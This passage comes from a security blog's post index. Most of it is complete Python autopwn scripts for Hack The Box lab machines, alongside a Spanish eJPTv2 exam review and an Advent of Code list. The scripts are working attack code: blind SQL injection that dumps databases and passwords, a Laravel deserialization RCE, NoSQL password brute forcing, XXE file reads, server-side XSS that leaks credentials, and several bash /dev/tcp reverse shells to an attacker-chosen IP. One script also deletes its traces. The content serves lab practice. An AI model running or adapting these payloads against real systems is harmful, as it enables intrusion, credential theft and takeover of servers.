response.text)[1].replace(&#39;&amp;amp;amp;&#39;,&#39;&amp;amp;&#39;) def dump_database(self): self.helpdesk_login() ticket_id = self.get_ticket_id() if self.args.database and self.args.table and self.args.column: # dump value of specific column, table and db p = log.progress(&#39;Value&#39;) sql_query = &#39;and convert((select if(SUBSTRING((select &#39; + self.args.column + &#39; from &#39; + self.args.database + &#39;.&#39; + self.args.table + &#39; group by &#39; + self.args.column + &#39; ASC limit {},1),1,{})=&quot;{}&quot;,1,&quot;&quot;)),char)&#39; self.print_dump_data(ticket_id, sql_query, p, characters=self.target[&#39;pattern_two&#39;]) elif self.args.database and self.args.table: # dump columns of specific table and db p = log.progress(&#39;Columns&#39;) sql_query = &#39;and convert((select if(SUBSTRING((select group_concat(column_name) from information_schema.columns where table_name=&quot;&#39; + self.args.table + &#39;&quot; and table_schema=&quot;&#39; + self.args.database + &#39;&quot; group by column_name ASC limit {},1),1,{})=&quot;{}&quot;,1,&quot;&quot;)),char)&#39; self.print_dump_data(ticket_id, sql_query, p, characters=self.target[&#39;pattern_one&#39;]) elif self.args.database: # dump tables of specific db p = log.progress(&#39;Tables&#39;) sql_query = &#39;and convert((select if(SUBSTRING((select group_concat(table_name) from information_schema.tables where table_schema=&quot;&#39; + self.args.database + &#39;&quot; group by table_name ASC limit {},1),1,{})=&quot;{}&quot;,1,&quot;&quot;)),char)&#39; self.print_dump_data(ticket_id, sql_query, p, characters=self.target[&#39;pattern_one&#39;]) elif self.args.dump: # dump databases p = log.progress(&#39;Databases&#39;) sql_query = &#39;and convert((select if(SUBSTRING((select group_concat(schema_name) from information_schema.schemata group by schema_name ASC limit {},1),1,{})=&quot;{}&quot;,1,&quot;&quot;)),char)&#39; self.print_dump_data(ticket_id, sql_query, p, characters=self.target[&#39;pattern_one&#39;]) def dump(self, ticket_id, sql_query, data_pos, p, characters, name_pos=1, name=&#39;&#39;): if self.send_injection(sql_query.format(data_pos, name_pos, name + &#39; &#39;), ticket_id): return name for letter in characters: p.status(name + letter) if self.send_injection(sql_query.format(data_pos, name_pos, name + letter), ticket_id): name += letter name_pos += 1 return self.dump(ticket_id, sql_query, data_pos, p, characters, name_pos, name) def send_injection(self, query, ticket_id) -&amp;gt; bool: target_url = &#39;http://&#39; + self.target[&#39;domain&#39;] + f&#39;/support/?v=view_tickets&amp;amp;action=ticket&amp;amp;param[]={ticket_id}{self.target[&quot;ticket_url&quot;]} &#39; + query req = Request(&#39;GET&#39;, target_url) prepare_req = self.session.prepare_request(req) response = self.session.send(prepare_req, proxies=self.proxies) if &#39;Page not found&#39; in response.text: return False else: return True def print_dump_data(self, ticket_id, query, p, characters): data_pos = 0 while True: name = self.dump(ticket_id, query, data_pos, p, characters) if name == None: break print(&#39;\\n|&#39; + name + &#39;|&#39;, end=&#39;&#39;) data_pos += 1# Main flowif __name__ == &#39;__main__&#39;: banner = &#39;| Help HTB |&#39; parser = ArgumentParser( formatter_class=RawDescriptionHelpFormatter, epilog=f&#39;&#39;&#39;Example: python3 {argv[0]} --file shell.php python3 {argv[0]} --dump -d support -t staff -c password&#39;&#39;&#39; ) parser.add_argument(&#39;-f&#39;, &#39;--file&#39;, type=str, help=&#39;Run uploaded file&#39;) parser.add_argument(&#39;--dump&#39;, action=&#39;store_true&#39;, help=&#39;Dump database&#39;) parser.add_argument(&#39;-d&#39;, &#39;--database&#39;, type=str, help=&#39;Show database tables&#39;) parser.add_argument(&#39;-t&#39;, &#39;--table&#39;, type=str, help=&#39;Show table columns&#39;) parser.add_argument(&#39;-c&#39;, &#39;--column&#39;, type=str, help=&#39;Show column values&#39;) args = parser.parse_args() print(banner) exploit = Exploit(args) exploit.run() Puedes encontrar el script, PoC y sus requerimientos en mi repositorio: https://github.com/E1P0TR0" }, { "title": "Academy RCE", "url": "/posts/HTBAcademy/", "categories": "HTB", "tags": "HTB, Linux, Easy, Python Scripting, CVE-2018-15133, Laravel, Deseralization", "date": "2023-07-24 12:00:00 -0500", "snippet": "Python ScriptWith the script you gain remote code execution like (www-data) user:#!/usr/bin/env python3&quot;&quot;&quot;Academy HTB------------Author: MarssDate: 24 Jul, 2023&quot;&quot;&quot;from argparse import ArgumentParser, RawDescriptionHelpFormatterfrom base64 import b64encode, b64decodefrom Crypto.Cipher import AESfrom Crypto.Util.Padding import padfrom hashlib import sha256import hmacfrom json import dumpsfrom requests import Session, Requestfrom requests.exceptions import ConnectionErrorfrom re import findallfrom signal import signal, SIGINT# debuggingimport pdb# Ctrl + c# (function)def signal_handler(signum, frame): exit(&#39;\\n[!] User aborted.&#39;)# (signal)signal(SIGINT, signal_handler)# Main Classclass Exploit: def __init__(self, args): self.args = args self.target = &#39;dev-staging-01.academy.htb&#39; self.session = Session() # proxies #self.proxies = {&#39;http&#39;:&#39;127.1:8080&#39;} #self.session.proxies.update(self.proxies) def run(self): try: if self.validate_connection(): APP_KEY = self.get_app_key() unserialize_payload = self.get_payload() payload_enc = self.encrypt_payload(APP_KEY, unserialize_payload) self.send_payload(payload_enc) except Exception as error: exit(&#39;\\n[x] Error: &#39; + repr(error)) def validate_connection(self) -&amp;gt; bool: try: req = Request(&#39;GET&#39;, &#39;http://&#39; + self.target) prepare_req = self.session.prepare_request(req) response = self.session.send(prepare_req) except ConnectionError: exit(f&#39;\\n[!] Please add domain &quot;{self.target}&quot; to /etc/hosts or verify connection machine.&#39;) return True def get_app_key(self) -&amp;gt; str: req = Request(&#39;GET&#39;, &#39;http://&#39; + self.target) prepare_req = self.session.prepare_request(req) response = self.session.send(prepare_req) app_key = findall(r&#39;APP_KEY.*\\s+(?: .*\\n?)&quot;&amp;lt;span .*?&amp;gt;(.*?)&amp;lt;/span&amp;gt;&#39;, response.text)[0] return app_key.split(&#39;:&#39;)[1] def get_payload(self) -&amp;gt; str: cmd = self.args.cmd cmd_len = str(len(self.args.cmd)) # generated with PHPGCC: https://github.com/ambionics/phpggc # ./phpggc/phpggc Laravel/RCE1 system &#39;&amp;lt;cmd&amp;gt;&#39; payload = &#39;O:40:&quot;Illuminate\\\\Broadcasting\\\\PendingBroadcast&quot;:2:{s:9:&quot;&#39; \\ + &quot;\\x00&quot; + &#39;*&#39; + &quot;\\x00&quot; \\ + &#39;events&quot;;O:15:&quot;Faker\\\\Generator&quot;:1:{s:13:&quot;&#39; \\ + &quot;\\x00&quot; + &#39;*&#39; + &quot;\\x00&quot; \\ + &#39;formatters&quot;;a:1:{s:8:&quot;dispatch&quot;;s:6:&quot;system&quot;;}}s:8:&quot;&#39; \\ + &quot;\\x00&quot; + &#39;*&#39; + &quot;\\x00&quot; \\ + &#39;event&quot;;s:&#39; + cmd_len + &#39;:&quot;&#39; + cmd + &#39;&quot;;}&#39; return payload def encrypt_payload(self, key: str, payload: str) -&amp;gt; str: cipher = AES.new(b64decode(key), AES.MODE_CBC) laravel_payload_enc = cipher.encrypt(pad(payload.encode(&#39;utf-8&#39;), AES.block_size)) iv = cipher.iv mac_hash = hmac.new( b64decode(key), b64encode(iv) + b64encode(laravel_payload_enc), sha256).hexdigest() laravel_cookie = { &#39;iv&#39;: b64encode(iv).decode(&#39;utf-8&#39;), &#39;value&#39;: b64encode(laravel_payload_enc).decode(&#39;utf-8&#39;), &#39;mac&#39;: mac_hash } malicious_cookie = dumps(laravel_cookie) malicious_cookie_b64 = b64encode(malicious_cookie.encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;) return malicious_cookie_b64 def send_payload(self, payload: str) -&amp;gt; str: cookies = {&#39;X-XSRF-TOKEN&#39;: payload} req = Request(&#39;POST&#39;, &#39;http://&#39; + self.target, cookies=cookies) prepare_req = self.session.prepare_request(req) response = self.session.send(prepare_req) print(findall(r&#39;&amp;lt;/html&amp;gt;((?:.*\\n?)+)&#39;, response.text)[0])# Main flowif __name__ == &#39;__main__&#39;: title = &#39;| Academy RCE (www-data) HTB |&#39; parser = ArgumentParser( formatter_class=RawDescriptionHelpFormatter, epilog=&#39;Example:\\n\\npython3 academy.py -c &quot;id&quot;&#39;) parser.add_argument(&#39;-c&#39;, &#39;--cmd&#39;, type=str, required=True, help=&#39;Execute a command&#39;) args = parser.parse_args() print(title) exploit = Exploit(args) exploit.run()PoC Puedes encontrar el script y sus requerimientos en mi repositorio: https://github.com/E1P0TR0" }, { "title": "NodeBlog Tools", "url": "/posts/HTBNodeBlog/", "categories": "HTB", "tags": "HTB, Linux, Easy, Python Scripting, NoSQLI, XXE, Deseralization", "date": "2023-07-21 12:00:00 -0500", "snippet": "Python ScriptWith the script you gain full access to machine, read files and bruteforce admin login password:#!/usr/bin/env python3&quot;&quot;&quot;NodeBlog HTB------------Author: MarssDate: 21 Jul, 2023&quot;&quot;&quot;import urllib.parsefrom argparse import ArgumentParser, RawDescriptionHelpFormatterfrom html import unescapefrom signal import signal, SIGINTfrom string import ascii_lettersfrom textwrap import dedentfrom re import findallfrom requests import Session, Request# debuggingimport pdb# Ctrl + c# (function)def signal_handler(signum, frame): exit(&#39;\\n[!] User terminated.&#39;)# (signal)signal(SIGINT, signal_handler)# main classclass Exploit: def __init__(self, args): self.args = args self.target = &#39;10.10.11.139:5000&#39; self.session = Session() # proxies #self.proxies = {&#39;http&#39;:&#39;http://127.1:8080&#39;} #self.session.proxies.update(self.proxies) def run(self): try: if self.args.brute: print(&#39;\\n[+] Getting admin password:&#39;) password = self.no_sql_inyection() exit(&#39;\\nAdmin passsword: &#39; + password) if self.args.file: print(f&#39;\\n[+] {self.args.file}:&#39;) content_file = self.xxe_read_file() exit(content_file) self.reverse_shell() except Exception as error: exit(&#39;\\n[x] Error: &#39; + repr(error)) def login(self, password: str) -&amp;gt; bool: post_data = { &#39;user&#39;: &#39;admin&#39;, &#39;password&#39;: {&#39;$regex&#39;: f&#39;{password}&#39;} } req = Request(&#39;POST&#39;, &#39;http://&#39; + self.target + &#39;/login&#39;, json=post_data) prepare_req = self.session.prepare_request(req) response = self.session.send(prepare_req) if &#39;Invalid Password&#39; in response.text: return False else: return True def no_sql_inyection(self, password=&#39;&#39;) -&amp;gt; str: print(password) if self.login(f&#39;^{password}$&#39;): return password for letter in ascii_letters: if self.login(f&#39;^{password}{letter}&#39;): password += letter return self.no_sql_inyection(password) else: continue def xxe_read_file(self) -&amp;gt; str: xxe_payload = dedent(&quot;&quot;&quot; &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY xxe SYSTEM &quot;file://{}&quot;&amp;gt; ]&amp;gt; &amp;lt;post&amp;gt; &amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt; &amp;lt;description&amp;gt;&amp;amp;xxe;&amp;lt;/description&amp;gt; &amp;lt;markdown&amp;gt;&amp;amp;xxe;&amp;lt;/markdown&amp;gt; &amp;lt;/post&amp;gt;&quot;&quot;&quot;.format(self.args.file)).strip(&#39;\\n&#39;) xml_file = {&#39;file&#39;: (self.args.file, xxe_payload, &#39;text/plain&#39;)} req = Request(&#39;POST&#39;, &#39;http://&#39; + self.target + &#39;/articles/xml&#39;, files=xml_file) prepare_req = self.session.prepare_request(req) response = self.session.send(prepare_req) try: content_file = findall(r&#39;value=.([^&quot;]*)&quot;&#39;, response.text)[0] except IndexError: exit(&#39;\\n[!] Probably this file doesn\\&#39;t exist.&#39;) return unescape(content_file) def reverse_shell(self): &quot;&quot;&quot; { &quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){ require(&#39;child_process&#39;).exec(&#39;&amp;lt;command&amp;gt;&#39;, function(error, stdout, stderr) { console.log(stdout) }); }()&quot; } &quot;&quot;&quot; cmd = &#39;echo IppsecSaysPleaseSubscribe | sudo -S bash -c \\&#39;bash -i &amp;gt;&amp;amp; /dev/tcp/{ip}/{port} 0&amp;gt;&amp;amp;1\\&#39;&#39;.format(ip=self.args.ip, port=self.args.port) payload = &quot;&quot;&quot;{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function(){\\\\nrequire(&#39;child_process&#39;).exec(\\\\&quot;%s\\\\&quot;, function(error, stdout, stderr) { console.log(stdout) });\\\\n}()&quot;}&quot;&quot;&quot; % cmd encoded_payload = urllib.parse.quote(payload) cookies = {&#39;auth&#39;: f&#39;{encoded_payload}&#39;} req = Request(&#39;GET&#39;, &#39;http://&#39; + self.target + &#39;/&#39;, cookies=cookies) prepare_req = self.session.prepare_request(req) print(f&#39;\\n[+] Open the port {self.args.port} to receive the shell&#39;) input(&#39;[+] Press ENTER to continue...&#39;) self.session.send(prepare_req)# main flowif __name__ == &#39;__main__&#39;: title = &#39;|NodeBlog HTB Tools|&#39; parser = ArgumentParser( formatter_class=RawDescriptionHelpFormatter, epilog=&#39;Example:\\n\\npython3 NodeBlog.py -i 10.10.10.10 -p 4444&#39;) parser.add_argument(&#39;-i&#39;, &#39;--ip&#39;, type=str, required=True, help=&#39;IP to receive the shell&#39;) parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, type=str, required=True, help=&#39;PORT to receive the shell&#39;) parser.add_argument(&#39;--brute&#39;, action=&#39;store_true&#39;, help=&#39;Get admin passwd&#39;) parser.add_argument(&#39;--file&#39;, type=str, help=&#39;Read system file (/etc/passwd)&#39;) args = parser.parse_args() print(title) exploit = Exploit(args) exploit.run()PoC Puedes encontrar el script y sus requerimientos en mi repositorio: https://github.com/E1P0TR0" }, { "title": "TwoMillion Foothold", "url": "/posts/HTBTwoMillion/", "categories": "HTB", "tags": "HTB, Linux, Easy, Python Scripting, Web API", "date": "2023-07-19 12:00:00 -0500", "snippet": "Python ScriptWith the script you gain www-data access to machine:#!/usr/bin/env python3&quot;&quot;&quot;TwoMillion Foothold-------------------Author: MarssDate: 19 July, 2023&quot;&quot;&quot;from argparse import ArgumentParser, RawDescriptionHelpFormatterfrom base64 import b64decodefrom json import loadsfrom random import choicefrom requests import Session, Requestfrom string import ascii_lettersfrom signal import signal, SIGINT# debuggingimport pdb# Ctrl + c# (function)def signal_handler(signum, frame): exit(&#39;\\n[!] User terminated.&#39;)# (signal)signal(SIGINT, signal_handler)# Main classclass Exploit: def __init__(self, args): self.args = args self.target_host = { &#39;ip_addres&#39;:&#39;10.10.11.221&#39;, &#39;domain_url&#39;:&#39;2million.htb&#39; } self.session = Session() # set proxies #self.proxies = {&#39;http&#39;: &#39;http://127.1:8080&#39;} #self.session.proxies.update(self.proxies) def run(self): try: invite_code = self.generate_code() random_user = self.get_random_string(5) username = self.register(invite_code, random_user) self.login(username) self.set_admin_perm(username) print(f&#39;[*] Open port {self.args.port} to receive the shell.&#39;) input(f&#39;[*] Press ENTER to continue.&#39;) self.reverse_shell() except Exception as error: exit(&#39;\\n[x] Error: &#39; + repr(error)) def b64_decode(self, encoded_data: str) -&amp;gt; str: b64_bytes = encoded_data.encode(&#39;ascii&#39;) cont_bytes = b64decode(b64_bytes) decoded_data = cont_bytes.decode(&#39;ascii&#39;) return decoded_data def generate_code(self)-&amp;gt; str: req = Request(&#39;POST&#39;, &#39;http://&#39; + self.target_host[&#39;domain_url&#39;] + &#39;/api/v1/invite/generate&#39;) prepare_req = self.session.prepare_request(req) response = self.session.send(prepare_req) b64_code = loads(response.text)[&#39;data&#39;][&#39;code&#39;] return self.b64_decode(b64_code) def get_random_string(self, length: int) -&amp;gt; str: return &#39;&#39;.join(choice(ascii_letters) for i in range(length)) def register(self, invite_code: str, user: str) -&amp;gt; str: post_data = { &#39;code&#39;: f&#39;{invite_code}&#39;, &#39;username&#39;: f&#39;{user}&#39;, &#39;email&#39;: f&#39;{user}@2million.htb&#39;, &#39;password&#39;: f&#39;{user}&#39;, &#39;password_confirmation&#39;: f&#39;{user}&#39; } req = Request(&#39;POST&#39;, &#39;http://&#39; + self.target_host[&#39;domain_url&#39;] + &#39;/api/v1/user/register&#39;, data=post_data) prepare_req = self.session.prepare_request(req) self.session.send(prepare_req) return user def login(self, user: str) -&amp;gt; str: post_data = { &#39;email&#39;: f&#39;{user}@2million.htb&#39;, &#39;password&#39;: f&#39;{user}&#39; } req = Request(&#39;POST&#39;, &#39;http://&#39; + self.target_host[&#39;domain_url&#39;] + &#39;/api/v1/user/login&#39;, data=post_data) prepare_req = self.session.prepare_request(req) self.session.send(prepare_req) def set_admin_perm(self, user: str) -&amp;gt; str: post_data = { &#39;email&#39;: f&#39;{user}@2million.htb&#39;, &#39;is_admin&#39;: 1 } req = Request(&#39;PUT&#39;, &#39;http://&#39; + self.target_host[&#39;domain_url&#39;] + &#39;/api/v1/admin/settings/update&#39;, json=post_data) prepare_req = self.session.prepare_request(req) self.session.send(prepare_req) def reverse_shell(self): bash_shell = &quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/{}/{} 0&amp;gt;&amp;amp;1&#39;&quot;.format(self.args.ip, self.args.port) post_data = { &#39;username&#39;: f&#39;;{bash_shell};&#39; } req = Request(&#39;POST&#39;, &#39;http://&#39; + self.target_host[&#39;domain_url&#39;] + &#39;/api/v1/admin/vpn/generate&#39;, json=post_data) prepare_req = self.session.prepare_request(req) self.session.send(prepare_req)# Main flowif __name__ == &#39;__main__&#39;: ascii_title=&quot;&quot;&quot;|Two Million HTB|&quot;&quot;&quot; parser = ArgumentParser( formatter_class=RawDescriptionHelpFormatter, epilog=&quot;Example:\\n\\npython3 foothold.py -i 10.10.10.10 -p 4444&quot;) parser.add_argument(&#39;-i&#39;, &#39;--ip&#39;, type=str, required=True, help=&#39;Specified IP to receive the shell&#39;) parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, type=str, required=True, help=&#39;Specified PORT to receive the shell&#39;) args = parser.parse_args() print(ascii_title) exploit = Exploit(args) exploit.run()PoC Puedes encontrar el script y sus requerimientos en mi repositorio: https://github.com/E1P0TR0" }, { "title": "eJPTv2 Certification", "url": "/posts/eJPTv2_Experience/", "categories": "OTHERS", "tags": "eJPTv2", "date": "2023-07-17 23:04:11 -0500", "snippet": "Mi experiencia sobre el eJPTv2 ¿Es tan sencilla como dicen?Después de adquirir el voucher del exámen en INE que contenía el nuevo curso de preparación Penetration Testing Student y 2 intentos para dar dar el exámen, logré aprobar el eJPTv2, aquí les cuento mi experiencia…Certification LinkPreparación previaEmpecé en el mundo de la ciberseguridad hace un año y pocos meses. Como la mayoría, empecé googleando: “¿Como empezar en el campo…?” hasta llegar a videos de YouTuBe sobre como usar Linux y montar un entorno virtualizado para empezar en el pentesting/hacking. Luego inicié resolviendo máquinas de la plataforma HackTheBox y algunas de TryHackMe, despues en paralelo entré un poco al campo de Redes haciendo parte de un curso del CCNA. Poco a poco fui aprendiendo cosas nuevas y a sentirme más cómodo, y para almacenar mis conocimientos creé este blog con diversos writeups y mucho python 🐍.Me decidí a inicio de año comprar el voucher y use como excusa el plazo de 6 meses que dan para dar el exámen. Además, el voucher tenía 3 meses de suscripción para acceder a los cursos de INE, el cuál lo use para completar el Penetration Testing Student que me sirvió para fortalecer y aprender nuevos conceptos.PTS (Penetration Testing Student)El curso tiene un total de 140 horas aproximadamente, se divide en 4 secciones correspondientes al exámen (todo esto ya lo analizan con calma en la página oficial). Con respecto al contenido: Me gustaron los conceptos, pero los dividian en muchas diapositivas y videos lo cuál lo hacia tedioso para repasarlo. Por parte de los exponentes del curso, hubo uno que no me contagiaba esa energía de aprender y explicaba sin ganas. También lo vi muy innecesario una sección de muchas horas sobre como aprender a usar el framework Metasploit, ya que claramente puedes explicarlo en un video y algunas diapositivas. La repetición de ciertos temas, un arma de doble filo. Estaba bueno para reforzar pero los repetian en distintas secciones y llegaba a confundir. Sobre los laboratorios para practicar, lo de siempre, son poco comodos y accesibles. Lo bueno es que los laboratorios de práctica se asimilan muy bien a la prueba.En general sí recomandaría el curso a personas que tengan algunos conceptos sobre linux y sepan usarlo de manera básica pero sin mucha experiencia en la parte del pentesting. Si ya hicieron máquinas de HTB o THM no se molesten en cursarlo, les irá bien!.Preparación Post PTSCon los 3 meses que me quedaban decidí buscar mas recursos sobre el exámen y los que más destacaría serían estos dos: Wreath TryHackMe: Un laboratorio en una red con 3 dispositivos donde deberás explotarlas y realizar pivoting. Solo ignoraría la sección de Command and Control. Entorno propio de máquinas simulando el eJPT: En el video realiza metodologías útiles para el proceso del exámen y explotación de máquinas pero por separado. Por ello te recomiendo montarlas en un entorno en VirtualBox/VMWare muy parecido el laboratorio “Wreath” (no temas que configurarlas es cosa de algunos clicks). Aquí te dejo el blog con las máquinas que usa https://systemweakness.com/ejptv2-review-280ff93d90a2. Día del exámenEl exámen consta de 35 preguntas y 48 horas, por ello es recomendable empezar al medio dia para así tener toda esa tarde, todo el proximo día y la mañana del siguiente, diría que es la mejor estratégia. En mi caso me tomé aproximadamente unas 6 a 7 horas en terminar el exámen. Estaba bastante entusiasmado y con ganas de ya acabar todo, lo cuál no recomiendo para nada apurarse tanto. Ni bien termines sabrás si aprobaste.Recomendaciones La mejor recomendación que te voy a dar es que ni bien inicies el exámen ignores las preguntas y empieces a escanear tu red y explotar todas las máquinas. Tomalo como si estuvieras en una auditoría, y no preocupes por el tiempo que irás de sobra y al final las preguntas se resolverán solas. Además, estoy muy seguro que mas importante es explotar todo primero de manera correcta y con tu reporte final en mano lograrás el puntaje máximo. Elige una buena aplicación para tomar notas de manera ordenada y organizada. Yo use SublimeText por temas de simplicidad y que estaba en Windows. Notion y CherryTree tambien son buenas alternativas. Es normal que tengas nervios y no te sientas seguro, confia sin miedo y juegatela. El exámen es mas sencillo de lo que crees. Prioriza una buena conexión a internet. No olvides que te proporcionarán un entorno con todas las herramientas necesarias via la página web. No tengamos la idea que usa Metasploit es malo. La mejor estrategia es saber juntar tu metodología manual con cualquier herramienta que automatiza algunos procesos. No olvidemos que lo mas importante es la experiencia de estar en una auditoria real, disfrutalo!" }, { "title": "Stocker Autopwn", "url": "/posts/HTBStocker/", "categories": "HTB", "tags": "HTB, Linux, Easy, Python Scripting, NoSQLI, XSS, Path Traversal", "date": "2023-04-23 16:53:30 -0500", "snippet": "Python ScriptWith the script you gain full access to machine:#!/usr/bin/env python3&quot;&quot;&quot;Stocker Autopwn----------------Author: MarssDate: 24 Apr, 2022&quot;&quot;&quot;from argparse import ArgumentParser, RawDescriptionHelpFormatterfrom paramiko import SSHClient, AutoAddPolicyfrom pwn import *from PyPDF2 import PdfReaderfrom re import findallfrom requests import Session, Request, getfrom signal import signal, SIGINT# Ctrl + c# (function)def signal_handler(signum, frame): exit(&#39;\\n[!] User terminated.&#39;)# (signal)signal(SIGINT, signal_handler)# Main classclass Exploit: def __init__(self, args): self.args = args self.target_host = { &#39;ip_address&#39; : &#39;10.10.11.196&#39;, &#39;domain_url&#39; : &#39;stocker.htb&#39;, &#39;subdomain_url&#39; : &#39;dev.stocker.htb&#39;, &#39;credentials&#39;: {&#39;user&#39;: &#39;angoose&#39;, &#39;pass&#39;: None} } self.session = Session() #self.proxies = {&#39;http&#39;: &#39;http://127.1:8080&#39;} def run(self): &quot;&quot;&quot; Exploit process --------------- (1) Bypass login panel (NoSQL injection) (2) Read local files (Server Side XSS [Dynamic PDF]) (3) Privilege command execution (Path Traversal by Wildcard) &quot;&quot;&quot; print(&#39;[*] Starting attack....&#39;) print(&#39;[*] Bypassing login panel in {}&#39;.format(self.target_host[&#39;subdomain_url&#39;])) self.bypass_login_panel() print(&#39;[*] Inyecting XSS payload: Target file -&amp;gt; index.js&#39;) self.read_local_files() print(&#39;[+] Creating and uploading Javascript Reverse Shell to target...&#39;) self.privilege_rce() def bypass_login_panel(self): try: headers = {&#39;Content-Type&#39;: &#39;application/json&#39;} post_data = { &#39;username&#39;: {&#39;$ne&#39;: &#39;null&#39;}, &#39;password&#39;: {&#39;$ne&#39;: &#39;null&#39;} } req = Request(&#39;POST&#39;, &#39;http://&#39; + self.target_host[&#39;subdomain_url&#39;] + &#39;/login&#39;, headers=headers, json=post_data) prepare_request = self.session.prepare_request(req) response = self.session.send(prepare_request) except Exception as error: exit(&#39;\\n[x] Error: &#39; + repr(error)) def read_local_files(self): try: file_to_read = &#39;/var/www/dev/index.js&#39; cmd_injection = &quot;&quot;&quot;&amp;lt;script&amp;gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(&#39;GET&#39;,&#39;file://%s&#39;);x.send();&amp;lt;/script&amp;gt;&quot;&quot;&quot; % file_to_read post_data = { &#39;basket&#39;: [ { &#39;_id&#39;: &#39;638f116eeb060210cbd83a8d&#39;, &#39;title&#39;: &#39;{}&#39;.format(cmd_injection), &#39;description&#39;: &#39;It\\&#39;s a red cup&#39;, &#39;image&#39;: &#39;red-cup.jpg&#39;, &#39;price&#39;: 32, &#39;currentStock&#39;: 4, &#39;__v&#39;: 0, &#39;amount&#39;: 1 } ] } req = Request(&#39;POST&#39;, &#39;http://&#39; + self.target_host[&#39;subdomain_url&#39;] + &#39;/api/order&#39;, json=post_data) prepare_request = self.session.prepare_request(req) response = self.session.send(prepare_request) order_id = findall(r&#39;&quot;orderId&quot;:&quot;(.*?)&quot;&#39;, response.text)[0] self.get_angoose_password(order_id) except Exception as error: exit(&#39;\\n[x] Error: &#39; + repr(error)) def get_angoose_password(self, order_id: str): req = Request(&#39;GET&#39;, &#39;http://&#39; + self.target_host[&#39;subdomain_url&#39;] + f&#39;/api/po/{order_id}&#39;) prepare_request = self.session.prepare_request(req) response = self.session.send(prepare_request) # download pdf leaked_data_file = &#39;leaked_data.pdf&#39; print(f&#39;[*] Downloading PDF -&amp;gt; {leaked_data_file}&#39;) with open(leaked_data_file, &#39;wb&#39;) as file: file.write(response.content) print(f&#39;[*] Extracting credentials of {leaked_data_file}...&#39;) # extract readable data reader = PdfReader(leaked_data_file) file_data = reader.pages[0].extract_text() # extract angoose password self.target_host[&#39;credentials&#39;][&#39;pass&#39;] = findall(r&#39;dbURI =\\n&quot;.*?://.*?:(.*?)@.*?&quot;;&#39;,file_data)[0] print(&#39;[+] Credentials -&amp;gt; {}&#39;.format(self.target_host[&#39;credentials&#39;])) def privilege_rce(self): try: _user = self.target_host[&#39;credentials&#39;][&#39;user&#39;] _pass = self.target_host[&#39;credentials&#39;][&#39;pass&#39;] ssh_client = self.ssh_connection(_user, _pass) # create workstation ssh_client.exec_command(&#39;mkdir -p /tmp/.{}&#39;.format(self.args.ip)) # create and upload malicious file file_name = &#39;rev_shell.js&#39; content_file = &quot;&quot;&quot;const { exec } = require(&#39;child_process&#39;);\\nexec(&quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/%s/%s 0&amp;gt;&amp;amp;1&#39;&quot;, (error, stdout, stderr) =&amp;gt; {if (error) {console.error(`exec error: ${error}`); return;}});&quot;&quot;&quot; % (self.args.ip, self.args.port) with open(file_name, &#39;wt&#39;) as file: file.write(content_file) print(f&#39;[+] Reverse Shell File created -&amp;gt; {file_name}&#39;) self.upload_file(ssh_client, file_name) print(&#39;[+] File uploaded to target -&amp;gt; /tmp/.{}/{}&#39;.format(self.target_host[&#39;ip_address&#39;], file_name)) print(&#39;[*] Exploiting Path traversal to receive privilege shell...&#39;) # execute reverse shell with path traversal bypass command = &#39;echo {} | sudo -S /usr/bin/node /usr/local/scripts/../../../tmp/.{}/{}&#39;.format(self.target_host[&#39;credentials&#39;][&#39;pass&#39;] ,self.args.ip, file_name) ssh_client.exec_command(command) # receive privilege shell shell = listen(self.args.port, timeout=20).wait_for_connection() if shell.sock: print(&#39;[!] Press Ctrl + D to exit.&#39;) shell.interactive() # remove workstation print(&#39;[-] Clearing tracks...&#39;) ssh_client.exec_command(f&#39;rm -r /tmp/.{self.args.ip}&#39;) # close ssh connection ssh_client.close() except Exception as error: exit(&#39;\\n[x] Error: &#39; + repr(error)) def upload_file(self, ssh_client, file_name): with ssh_client.open_sftp() as sftp_client: sftp_client.put(file_name, &#39;/tmp/.{}/{}&#39;.format(self.args.ip, file_name)) def ssh_connection(self, username: str, password: str): try: ssh_client = SSHClient() ssh_client.set_missing_host_key_policy(AutoAddPolicy()) ssh_client.connect(self.target_host[&#39;ip_address&#39;], port=22, username=username, password=password) return ssh_client except Exception as error: exit(&#39;\\n[x] Error: &#39; + repr(error))# Main Flowif __name__ == &#39;__main__&#39;: ascii_title=&quot;&quot;&quot; ____ ___ ____ ____ _ _ ____ ____ ____ _ _ ___ ____ _ _ _ ___ _ _ [__ | | | | |_/ |___ |__/ |__| | | | | | | | | |__] |\\ | ___] | |__| |___ | \\_ |___ | \\ | | |__| | |__| |_|_| | | \\| by marss &quot;&quot;&quot; parser = ArgumentParser( formatter_class=RawDescriptionHelpFormatter, epilog=&quot;Example:\\n\\n python3 autopwn.py -i 10.10.10.10 -p 5555&quot;) parser.add_argument(&#39;-i&#39;, &#39;--ip&#39;, type=str, required=True, help=&quot;Specified ip to receive the shell&quot;) parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, type=int, required=True, help=&quot;Specified port to receive the shell&quot;) args = parser.parse_args() print(ascii_title) exploit = Exploit(args) exploit.run()PoC Puedes encontrar el script y sus requerimientos en mi repositorio: https://github.com/E1P0TR0" }, { "title": "Advent of Code 2022", "url": "/posts/Advent_of_code_2022/", "categories": "OTHERS", "tags": "Python Scripting", "date": "2022-12-30 23:40:23 -0500", "snippet": "To code!Programming logic challenges for 25 days, categorized into various difficulties and the choice to solve each challenge with your preferred language.I will publish in my repository https://github.com/E1P0TR0 each challenge of the day: Day 1 -&amp;gt; ✅ Day 2 -&amp;gt; ✅ Day 3 -&amp;gt; ✅ Day 4 -&amp;gt; ✅ Day 5 -&amp;gt; ✅ Day 6 -&amp;gt; ✅ Day 7 -&amp;gt; ✅ Day 8 -&amp;gt; ✅ Day 9 -&amp;gt; ❌ Day 10 -&amp;gt; ❌ Day 11 -&amp;gt; ❌ Day 12 -&amp;gt; ❌ Day 13 -&amp;gt; ❌ Day 14 -&amp;gt; ❌ 